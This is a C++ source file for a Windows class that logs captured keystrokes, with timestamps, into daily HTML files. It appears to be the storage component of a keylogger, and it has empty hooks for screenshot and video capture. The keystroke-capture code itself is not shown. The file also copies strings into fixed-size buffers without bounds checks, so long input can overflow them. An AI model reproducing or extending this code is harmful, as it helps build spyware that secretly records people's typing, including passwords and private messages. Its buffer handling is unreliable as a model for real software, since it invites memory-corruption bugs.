#include <Windows.h>
#include <stdio.h>
#include <DbgHelp.h> // for MakeSureDirectoryPathExists(fileName);
#include "DataAccumulator.h"
#include "DataProvider.h"
#include "FileSystemEntity.h"
#include "resource.h" // for getting HTML log header

const int DataAccumulator::BUFFER_SIZE = 256;//8192; // 4 pages: 8K unicode chars
const PSTR const DataAccumulator::DATA_FILE_NAME = "log.html";

DataAccumulator::DataAccumulator(void)
{
	mPreviousRowExists = false;
	mPreviousParagraphExists = false;
	mCurrentChunkLength = 0;
	chunk = new WCHAR[BUFFER_SIZE];
	memset(chunk, 0, BUFFER_SIZE * sizeof(WCHAR));
	mIsFirstLog = FALSE;
}

DataAccumulator::~DataAccumulator(void)
{
	FlushChunk(); // write remaining log info to file
	delete[] chunk;
}

void DataAccumulator::LogKey(PWSTR key)
{
	Log2HTML(key);
}

void DataAccumulator::LogVideo(PTSTR videoFile)
{
}

void DataAccumulator::LogPrintScreen(PTSTR imageFile)
{
}

void DataAccumulator::Append2Log(PWSTR newAppendee) {
	mCurrentChunkLength += wcslen(newAppendee);
	wcscat(chunk, newAppendee);
}

void DataAccumulator::Log2HTML(PWSTR htmlString) {
	// If appendee is nearly full, flush it to disk
	if (mCurrentChunkLength > 0.9 * BUFFER_SIZE) {
		FlushChunk();
		mCurrentChunkLength = 0;
	}

    int elapsedSeconds = GetElapsedSecondsFromLastLog();
    if (elapsedSeconds > 60*5) // 5 min.
    {
		if (mPreviousRowExists) {
			Append2Log(L"</p>\n\t\t\t\t\t</td>\n\t\t\t\t</tr>\n");
		}
        Append2Log(L"\t\t\t\t<tr>\n\t\t\t\t\t<td>");

        SYSTEMTIME time;
        GetSystemTime(&time);
        WCHAR timeS[20];// strlen(12.12.2012 12:12:12\0) == 20
        wsprintfW(timeS, L"%hu.%hu.%hu %hu:%hu:%hu", time.wDay, time.wMonth, time.wYear, time.wHour, time.wMinute, time.wSecond);
        Append2Log(timeS);

        Append2Log(L"</td>\n\t\t\t\t\t<td>\n\t\t\t\t\t\t<p>");
		mPreviousRowExists = true;
		mPreviousParagraphExists = true;
    }
    else if (elapsedSeconds > 60) // 1 min
    {
		if (mPreviousParagraphExists) {
			Append2Log(L"</p>\n");
		}

		Append2Log(L"\t\t\t\t\t\t<p>");
		mPreviousParagraphExists = true;
    }
    else if (elapsedSeconds > 10)
    {
        Append2Log(L"<br>");
    }

    Append2Log(htmlString);
}

int DataAccumulator::GetElapsedSecondsFromLastLog() 
{
	const int PERIODS_IN_SEC = 10000000; // Number of 100 nanosec periods in second.
	int seconds = 0;

	// Get current time into LARGE_INTEGER for further subtraction
	SYSTEMTIME stNow;
	FILETIME ftNow;
	LARGE_INTEGER liNow;
	GetLocalTime(&stNow);
	SystemTimeToFileTime(&stNow, &ftNow);
	liNow.HighPart = ftNow.dwHighDateTime;
	liNow.LowPart = ftNow.dwLowDateTime;

	// Time of last log into LARGE_INTEGER
	LARGE_INTEGER liLastLogTime;
	liLastLogTime.HighPart = mLastLogTime.dwHighDateTime;
	liLastLogTime.LowPart = mLastLogTime.dwLowDateTime;

	if (mIsFirstLog)
	{
		seconds = INT_MAX;
		GetLocalTime(&mFirstLogInFile);
	}
	else
	{
		seconds = (liNow.QuadPart - liLastLogTime.QuadPart) / PERIODS_IN_SEC;
	}
	
	// Same day as we started this log?
	if (mFirstLogInFile.wDay == stNow.wDay && mFirstLogInFile.wMonth == stNow.wMonth 
		&& mFirstLogInFile.wYear == stNow.wYear) {
			mIsFirstLog = FALSE; 
	}
	else {
			// When new log for next day is created this flag should be TRUE 
			mIsFirstLog = TRUE; 
			seconds = INT_MAX;
	}

	mLastLogTime.dwHighDateTime = ftNow.dwHighDateTime;
	mLastLogTime.dwLowDateTime = ftNow.dwLowDateTime;

	return seconds;
}

LPCWSTR DataAccumulator::GetHtmlFromResource(int resourceId, PWORD length)
{
	wchar_t* result = NULL;
	WORD errorCode;
	HMODULE hModule = GetModuleHandle(NULL);
	HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(resourceId), RT_HTML);

	if (hResource)
	{
		HGLOBAL hLoadedResource = LoadResource(hModule, hResource);

		if (hLoadedResource)
		{
			result = (wchar_t*) LockResource(hLoadedResource);
			*length = SizeofResource(hModule, hResource);
		}
	}

	return result;
};

void DataAccumulator::FlushChunk() {
	const WCHAR* HTML_FOOTER = L"\t\t\t</table>\n\t\t</center>\n\t</body>\n</html>";

	WCHAR footer[512] = {0}; // Yeah! Call it magic number!

	// Build the page footer
	if (mPreviousRowExists) {
		wcscpy(footer, L"</p>\n\t\t\t\t\t</td>\n\t\t\t\t</tr>\n");
	}
	wcscat(footer, HTML_FOOTER);

	// Compile full log file name
	CHAR fileName[100];
	SYSTEMTIME localTime;
	GetLocalTime(&localTime);
	strcpy(fileName, DataProvider::DATA_DIR);
	strcat(fileName, "\\");
	char date[20];
	sprintf(date, "%02hu_%02hu_%02hu", localTime.wYear, localTime.wMonth, localTime.wDay);
	strcat(fileName, date);
	strcat(fileName, "\\");
	strcat(fileName, DATA_FILE_NAME);

	MakeSureDirectoryPathExists(fileName);

	// Create new log file or use existing
	HANDLE logHandle = CreateFileA(fileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD writtenBytes;
	if (GetLastError() == ERROR_ALREADY_EXISTS) {
		// In case the file exists, seek to where last log entry was written
		SetFilePointer(logHandle, wcslen(footer) * (-1 * sizeof(wchar_t)), NULL, FILE_END);
	}
	else { // ERROR_SUCCESS assumed - the file was created
		WORD headerSize;
		LPCWSTR header = GetHtmlFromResource(LOG_HEADER, &headerSize);
		WriteFile(logHandle, header, headerSize, &writtenBytes, NULL);
	}

	// Write log chunk and footer (to make HTML valid)
	WriteFile(logHandle, chunk, mCurrentChunkLength*sizeof(wchar_t), &writtenBytes, NULL);
	WriteFile(logHandle, footer, wcslen(footer)*sizeof(wchar_t), &writtenBytes, NULL);
	CloseHandle(logHandle);

	// Reset chunk
	memset(chunk, 0, BUFFER_SIZE * sizeof(WCHAR));
};
